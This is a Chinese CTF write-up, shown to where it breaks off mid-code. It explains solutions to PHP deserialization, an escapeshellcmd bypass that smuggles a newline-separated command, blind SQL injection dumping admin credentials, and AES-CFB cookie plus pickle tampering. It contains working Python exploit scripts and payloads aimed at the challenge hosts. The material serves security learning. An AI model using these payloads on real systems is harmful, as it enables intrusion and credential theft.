<p>思路其实很简单，Trigger的__toString肯定是在echo反序列化那里触发，Config还有一个__wakeup也是一个触发点，File直接打开一个handler，名字提醒也很直接，flag在&#x2F;flag&#x2F;flag，但是唯一能拿到文件内容的file_get_contents前面有一个过滤ban了flag<br>所以肯定是通过File打开flag文件留下一个fd，然后从proc里面去读</p>
<p>很简单啊，就是有一个问题，Trigger只有一个成员变量，这个成员变量肯定得最后是一个文件名，而上面两个类肯定返回不了文件名，那咋整？<br>此处可以体现我的傻逼<br>一开始想的是整一个array进行反序列化，结果发现echo的时候直接输出的是Array，没触发到Trigger，那就必然只能走Trigger了，但是Trigger不能带数据啊，怎么办？<br>然后想出了奇怪的利用，能不能在Config的数组里面把一个类对象作为键，然后报错告诉我显然不行，至少得是字符串作为键，我是垃圾呜呜呜<br>然后发现文件不存在还会报错，最后又想着能不能通过报错带一个信息出来（最后发现我不知道为什么这么简单一个题能想的这么复杂）</p>
<p>最后的最后，发现可以无中生有的编造一个属性出来，直接多带一个类进去反序列化。。。。<br>然后我还提出了愚蠢的嵌套Trigger操作，让里层Trigger读出flag返回出来再让外层Trigger去读flag值对应的文件读不到报错获取flag。。。。完全没有意义啊，我是垃圾</p>
<p>就着上面这个憨批payload也能打通，就是显得比较愚蠢罢了<br>然后就是fd得猜，手动爆破，rmb神仙就比较nb，直接在PHP里面生成payload然后用curl发出去了，一体化攻击。很好的操作，偷学一下<code>system(&#39;curl &quot;http://8.136.131.7:30683&quot; -d &quot;data=&#39;.$data.&#39;&quot;&#39;)</code></p>
<p>然后我憨批的把payload拿到python里面写脚本，踩了另外一个坑<br>因为存在private属性所以有不可见字符，常理都是编码打过去，所以我先在PHP里面输出了url编码过的payload，在放到python里面去遍历fd，结果半天打不通，最后去查文档，发现是requests.post还会自动给你加一遍url编码，二次编码了就，content-type默认是urlencode那个，呜呜<br>还有一个不方便的就是fd遍历的时候要手改字符串长度</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://8.136.131.7:30683/"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    trigger <span class="token operator">=</span> <span class="token string">'O:7:"Trigger":2:{s:8:"filename";O:7:"Trigger":1:{s:8:"filename";s:16:"/proc/self/fd/'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'";}s:1:"a";O:6:"Config":2:{s:6:"config";a:1:{s:10:"/flag/flag";s:3:"ccc";}s:15:"\0Config\0handler";O:4:"File":1:{s:10:"\0File\0file";N;}}}'</span>
    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"data"</span><span class="token punctuation">:</span> trigger<span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true"># print(payload)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"CTF"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
</code></pre>
<h3 id="反序列化顺序"><a href="#反序列化顺序" class="headerlink" title="反序列化顺序"></a>反序列化顺序</h3><p>小小的点，刚写这个的时候才想起来这个东西，如果我先去file_get_contents，再去fopen，那肯定fd没打开就读不到，所以得保证事件发生的先后，所以，欠考虑了，这里反序列化的顺序是没问题的，因为先触发wakeup这个方法，一反序列化就触发，而toString在反序列化结束之后echo才被触发，自然是先打开fd再去读取了</p>
<p>不过，要是大家都是同样的触发条件，比如都是wakeup触发，顺序会变成什么样呢？可以用如下垃圾代码进行测试</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">A</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"im A"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">B</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"im B"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">C</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"im C"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>

<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>输出结果为<code>im Aim Bim C</code>调换一下顺序可以知道，反序列化的顺序应该是按照类定义中变量的排列顺序决定的，我们强加的未知属性c也能被反序列化，且在定义变量全部完成反序列化后进行，反序列化顺序与变量的访问控制权限无关(即public,protected,private不影响顺序)</p>
<p>比赛结束了，因为时间不够所以没看什么题，rmb神仙告诉我环境没关，今天看了一个下午，头被打烂了，事实证明时间给够了也做不出来，但是还是学到了不少东西<br>我是垃圾呜呜呜</p>
<h2 id="best-toolkit"><a href="#best-toolkit" class="headerlink" title="best_toolkit"></a>best_toolkit</h2><p>头给打烂了，连萌新赛都不会做，对着答案看了一个小时各种调试才看懂发生了什么<br>呜呜<br>提供了ping，MD5，base64这几个功能<br>看js也好抓包也好，能看到请求其实是发送到后端一个api&#x2F;router.php?r&#x3D;xx这样的请求里的，一开始盲测了好久，觉得就ping功能能打，但是打了半天也不知道怎么回事，一开始以为是拼接进system函数，还专门猜了猜怎么实现的base64，最后打半天打不通感觉可能用了escapeshellcmd，最后的最后，发现这个router.php其实是个文件包含。。。。读了三个源码，除了ping都是直接PHP函数实现的，我就说怎么测半天测不出来。。。。</p>
<p>贴一下源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token string">"ping -c 1 "</span> <span class="token punctuation">.</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>

<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\;"</span><span class="token punctuation">,</span> <span class="token string">"%%%%%"</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fullcommand_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token variable">$fullcommand_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$fullcommand</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"%%%%%"</span><span class="token punctuation">,</span> <span class="token string">"\;"</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// Grab the current value of $fullcommand and store it to display in the run check command results box in order to maintain obfuscation</span>
<span class="token variable">$displaycommand</span> <span class="token operator">=</span> <span class="token variable">$fullcommand</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Fix escaping for quoted sections</span>
<span class="token variable">$escaped_cmd</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$fullcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// Build array of quoted parts, and the same escaped</span>
<span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/\'[^\']+\'/'</span><span class="token punctuation">,</span> <span class="token variable">$fullcommand</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$matches</span> <span class="token operator">=</span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$quoted</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$matches</span> <span class="token keyword">as</span> <span class="token variable">$match</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$quoted</span><span class="token punctuation">[</span><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$match</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// Replace sections that were single quoted with original content</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$quoted</span> <span class="token keyword">as</span> <span class="token variable">$search</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$replace</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$escaped_cmd</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$search</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$escaped_cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$escaped_cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>命令注入题，简单说一下怎么回事，只把第一个分号前的语句进行处理，但允许出现被转义的分号，即\;<br>使用了escapeshellcmd函数，回顾一下escapeshellcmd，就是把所有可能执行多条语句的符号全部转义，成对的引号不会被转义，管道符分号回车什么的都会被转义，就确保只能执行一条命令，对整个字符串进行了escapeshellcmd，再把原字符串中单引号包裹的内容匹配起来，将引号内escapeshellcmd后的内容又给替换回来</p>
<p>一开始想着单引号内的字符不受影响，就想办法在单引号里放反斜杠转义掉单引号来逃逸，试了半天没试成功，并且发现好像一切和我的思路并不一致</p>
<h3 id="转义与单双引号"><a href="#转义与单双引号" class="headerlink" title="转义与单双引号"></a>转义与单双引号</h3><p>坑爹单引号，以前单是知道单引号能忽略$美元符号的变量解析，没想到单引号是最牛逼的，单引号内的所有字符均无效，包括转义字符<br>双引号是无效大部分特殊字符，但是转义字符，美元符号之类的部分还有效，如果不用引号包裹的话，还会有很多元字符会生效，比如<code>= &amp; ! |</code>等等<br>成对的单引号没法被转义，只要有一个半开单引号shell就会等待另一个单引号闭合，你输入啥都没用，而’\‘这样的序列则会直接被认为是一个反斜杠<br>这个点真的是我调试了好久，最后才发现的。。。<br>最后去查了文章<a href="https://www.cnblogs.com/mydomain/archive/2011/10/15/2213017.html">shell转义，单引号与双引号，反撇号</a></p>
<p>所以题目防御看起来很完美，单引号外的字符全部转义，单引号内的字符不会被转义但完全失去效果</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>我当初对着答案看了好久也没看出来怎么回事。。。最后调试调试歪打正着的懂了<br>正则处写的是<code>/\&#39;[^\&#39;]+\&#39;/</code>两个引号内使用的是+，也就是说引号内如果为空是不会被匹配的<br>那么构造如下输入</p>
<pre class=" language-shell"><code class="language-shell">aaa'
'''
'whoami'
</code></pre>
<p>这时正则匹配到的是<code>&#39;\n&#39;</code>这样子一个序列，而三个连着的引号处的那对空引号不会被匹配，这样子导致了正则匹配和实际引号匹配的失配，原本暴露在引号对外的换行符被认为是包裹在引号对内，而避免了被转义，而命令注入除了分号能分隔命令外，换行也能，system函数其实就是把你的输入输入到shell里直接运行，成功完成了利用<br>这里有一个小点，就是单引号包裹的命令也是能直接跑的，并且单引号包裹的其实就是指其内部所有字符均是字符字面值，并且可以直接和别的字符串拼起来，所以不仅是<code>&#39;ls&#39; -l /</code>可行，就连<code>&#39;who&#39;ami</code>都是可以跑起来的</p>
<p>说实话，我感觉我学到的东西好多</p>
<h2 id="make-big-news’-revenge"><a href="#make-big-news’-revenge" class="headerlink" title="make_big_news’ revenge"></a>make_big_news’ revenge</h2><p>普通版本的就没看了，强化版的多了几个过滤<br>显然id处可注入，id&#x3D;1会有特朗普字样<br>简单测试知过滤了空格，union，等号引号<br>头一次遇上SQL注入没有database函数的，我就说我本地测通了实际上也存在盲注怎么就是database()这里打不通。。结果就是一开始试图爆database()半天没反应，以为不是mysql，测了一下又感觉不像其他的，最后问rmb神仙，他告诉我他启动mysql的时候没用use xxx。并且select还是写的select xx from xx.xx这种形式。。。所以database()为NULL。。。。</p>
<p>头一次查怎么拿到所有数据库<code>select schema_name from information_schema.schemata</code>虽然能猜出来是在information_schema，不过在哪个表里真不知道。。。<br>接下来的倒是没什么东西了，空格用&#x2F;**&#x2F;代替，括号构造的好其实还不需要，引号没了指定库名表名进行查询的时候用16进制代替，最后查字段的时候记得用xx.xx的形式库名表名均指定</p>
<p>上脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://42.192.184.223:25566/?id="</span>


result <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> <span class="token number">0</span>
    q <span class="token operator">=</span> <span class="token number">256</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">+</span>q<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token comment" spellcheck="true"># news payload = "0 or ascii(substr((select group_concat(schema_name)from(information_schema.schemata)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
        <span class="token comment" spellcheck="true"># admin payload = "0 or ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema)like(0x6e657773)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
        <span class="token comment" spellcheck="true"># username,,password payload = "0 or ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_name)like(0x61646d696e)),{},1))>{}".replace(' ', '/**/').format(str(i), str(m))</span>
        payload <span class="token operator">=</span> <span class="token string">"0 or ascii(substr((select group_concat(username,0x3a,password)from(news.admin)),{},1))>{}"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>

        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"特朗普"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># print(1)</span>
            p <span class="token operator">=</span> m
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            q <span class="token operator">=</span> m
        <span class="token keyword">if</span> q <span class="token operator">-</span> p <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
</code></pre>
<p>昨天嘶吼注完今天又注，这个还是轻松一点。。昨天注了一天今天感觉思路清晰一点了</p>
<h2 id="BuyAndSell"><a href="#BuyAndSell" class="headerlink" title="BuyAndSell"></a>BuyAndSell</h2><p>发现自己原来对AES和pickle的理解都不够深入，双重的垃圾呜呜</p>
<p>提供了初始化，买卖看源码几个功能，钱就100只能买垃圾，先看init路由，签发了两个cookie，一个看起来很像jwt，另一个纯十六进制的感觉，像jwt就放到jwt里面去解码，结果发现是个flask的cookie，不过flask和jwt的cookie都存在明文部分，其实也就是base64，直接解码base64都行</p>
<p>cookie明文是算法和密钥，算法用的AES-128-CFB，就给了这么点东西，估摸着就是解码那个16进制的cookie看看下一步怎么整了，然后这个解码我整了差不多一个下午呜呜</p>
<p>所以需要先基本理解一下AES加解密什么情况</p>
<h3 id="AES加解密过程"><a href="#AES加解密过程" class="headerlink" title="AES加解密过程"></a>AES加解密过程</h3><p>AES是对称密钥加密的分组密码，使用CFB反馈模式的时候需要一个初始向量iv，之前学密码学的时候就普通的认为加密解密方都同步持有iv，但今天应用起来这并不现实<br>一开始没注意这个，想了好久<br>使用的是python的pycryptodome模块，不知道为什么python3下面用不起来，用的Python2写的</p>
<p>就看pycryptodome文档的示例，它是这么实现的</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token operator">>></span><span class="token operator">></span>
<span class="token operator">>></span><span class="token operator">></span> key <span class="token operator">=</span> b<span class="token string">'Sixteen byte key'</span>
<span class="token operator">>></span><span class="token operator">></span> cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> msg <span class="token operator">=</span> cipher<span class="token punctuation">.</span>iv <span class="token operator">+</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>b<span class="token string">'Attack at dawn'</span><span class="token punctuation">)</span>
</code></pre>
<p>发送消息时，直接将iv放在密文的前面发送，而解密的时候，前16位作为iv截取下来，再对16位之后的密文进行解密<br>函数如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    iv <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span>
    data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    data <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data
</code></pre>
<p>而新创建的cipher对象若不显式指定iv，会随机初始化iv，这样子会导致解密错误，不过由于CFB模式的特殊性，错误的传递是有限的，就算是对<code>msg = cipher.iv + cipher.encrypt(b&#39;Attack at dawn&#39;)</code>这样的内容直接使用库解密函数，不进行如上初始向量和数据的划分，直接用新建对象的随机iv进行解密，也能得到正确的明文，因为随机初始化的iv把消息前面发送过来的iv解码出乱码(这本来就没用，被我们丢弃)，而接下来解码明文时使用的却是发送过来数据的前16字节，也就是正确的iv。<br>（不过说实话，这听起来更像CBC，因为CFB应该不是刚好iv和密文分组大小一致的）<br>在这个类似CBC的CFB模式下，解码函数可以简写为</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span>
    data <span class="token operator">=</span> aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data
</code></pre>
<p>也正是这个错误传递的有限性，导致了另一个有意思的点，也耽误了我几个小时的时间<br>因为一开始并没有理解AES的加密方式，所以直接将获得的iv+cipher的消息解密，得到了乱码开头的数据拼上有用的明文，然后直接修改明文重新加密，也不需要发送什么iv，直接把加密掉的数据一股脑的发送出去，发现也能成功解密出明文<br>也就是这么个伪代码形式的东西也跑的通</p>
<pre class=" language-python"><code class="language-python">cipher <span class="token operator">=</span> xxx <span class="token comment" spellcheck="true"># 这是iv+cipher的标准形式</span>
plain <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 直接带iv使用新产生的随机iv解密，得到一个16字节奇怪数据+明文的结果</span>
cipher_new <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">)</span><span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 再进行一波强行加密，使用随机的iv，并且加密的数据还是16字节奇怪字符+明文</span>
<span class="token keyword">print</span> decrypt<span class="token punctuation">(</span>cipher_new<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 结果只有正确的明文</span>
</code></pre>
<p>了解了这个类CBC的CFB的模式就能知道，每一组的加解密依赖于前一组，所以在明文前面加16字节奇怪的数据并不影响加解密，因为明文的加解密都依赖于前面这16字节的怪数据，随机产生的iv只影响这16字节的怪数据，刚好这个这个16字节的冗余数据就隔断了实际数据受到的随机初始向量的影响</p>
<p>真的这个点坑了我好久。。。我感觉我和rmb神仙都绕进去了，他自己写的东西都记不清了</p>
<p>然后我们说了这么大一堆乱七八糟的，实际上就直接解码，能拿到16字节乱码加数据，其实就可以看到加密内容是什么了，但是由于我过于愚蠢打不通，所以以为是加密的问题</p>
<h3 id="Pickle反序列化"><a href="#Pickle反序列化" class="headerlink" title="Pickle反序列化"></a>Pickle反序列化</h3><p>以前手搓过不少pickle了，自认为其实还蛮懂，但是就掌握几个常用的opcode，今天面对原生opcode还是傻眼了，然后犯了几个低级错误，搞了一下午加一晚上，又懒得看python源码，事实上也没多难，后来看了眼源码一下就猜出来什么情况了，呜呜<br>pickle作为栈语言，操作就是各种出入栈<br>一步步分析一下python原生的opcode序列</p>
<pre class=" language-python"><code class="language-python">\x80\x03capp
User
q\x00<span class="token punctuation">)</span>\x81q\x01<span class="token punctuation">}</span>q\x02<span class="token punctuation">(</span>X\x05\x00\x00\x00moneyq\x03K_X\x05\x00\x00\x00itemsq\x04<span class="token punctuation">]</span>q\x05X\x04\x00\x00\x00goldq\x06aub<span class="token punctuation">.</span>
</code></pre>
<pre><code>\x80 指定pickle协议版本，这里的版本是3，手搓的一般是0版本
c 引入app.User，压入栈顶
q 输入单字节参数，不知道有什么用，每次出现q后面的数字加一，类似计数器
) 压入空元组
\x81 查找不到详解，pickle源码注释为build object by applying cls.__new__ to argtuple使用class的new属性，以元组为参数，构造类对象 后来读到题目源码的时候发现User类不存在构造函数，应该是把空元祖和app.User弹出来整了一个实例User对象压回去
q 又输入了奇奇怪怪的东西
&#125; 压入空字典
q 再输入一个奇怪的东西
( 压入MARK
X utf-8string长度计数，输入5 0 0 0 money (X这个参数无详解也看不懂源码注释说的是什么，暂且这么理解)
q 再再输入一个奇怪的东西
K 压入一字节无符号整数，_下划线的ascii码为95
X 又输入 5 0 0 0 items
q 再再再输入奇怪的东西
] 压入空列表
q 再再再再输入奇怪的东西
X 输入 4 0 0 0 gold
q 再再再再再输入奇怪的东西

此时栈结构从栈底到栈顶为 User &#123;&#125; MARK 长度为5的字符串money 无符号整数95 长度为5的字符串items [] 长度为4的字符串gold

a 将栈的第一个元素append到第二个元素(必须为列表)中  此时栈内容变成User &#123;&#125; MARK money 95 items [&#39;gold&#39;]
u     寻找栈中的上一个MARK，组合之间的数据(数据必须有偶数个，即呈key-value对)并全部添加或更新到该MARK之前的一个元素(必须为字典)中 栈变为User &#123;&quot;money&quot;:95, items:[&quot;gold&quot;]&#125;
b 调用__dict__.update() 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 用字典的键值对User的属性进行赋值
. 结束
</code></pre>
<p>其实也没必要分析这么多，你就看到X后面跟了个数字，然后看到pickle源码里写着counted UTF-8 string argument，就能估摸出个大概了。。也就是说修改内容的时候记得顺便改一下对应的X后面对应的长度<br>一开始就直接把gold修改成了source_code，就一直500，我一直怀疑是自己加解密有问题，最后发现原生的pickle还是和手搓的不一样，这些参数都是自己指定长度的，不像以前一个S随便压字符串<br>不过手搓压字符串是因为类有构造函数，所以直接调用构造函数当然是以字符串作为参数，不过这里没有构造函数，是构造空对象然后构造字典再update过去</p>
<p>然后，到这一步才算拿到源码，我已经学死了，我好弱呜呜呜<br>服务以及都关了，还有一个java题不看了，反序列化真不会，没有rmb教我可能上面好多题都不会呜呜呜呜呜呜呜呜<br>明天看一下源码打，感觉是个手搓命令执行，应该不会太难了（吧）</p>
<h3 id="反序列化限制绕过"><a href="#反序列化限制绕过" class="headerlink" title="反序列化限制绕过"></a>反序列化限制绕过</h3><p>就放源码反序列化限制相关的内容</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># Only allow safe classes</span>
        <span class="token keyword">if</span> <span class="token string">'app'</span> <span class="token operator">==</span> module<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">and</span> <span class="token string">"__"</span> <span class="token operator">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># Forbid everything else.</span>
        <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
